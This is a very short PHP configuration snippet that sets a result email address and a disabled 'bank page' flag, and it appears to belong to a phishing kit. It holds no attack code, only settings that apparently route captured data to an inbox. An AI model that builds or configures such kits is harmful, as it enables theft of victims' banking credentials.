<?php

/*   
                      
*/
$XGHOST_EMAIL = "adel.bensaid90@gmail.com"; // Enjoy 
$bankPageEnable = false;
?>
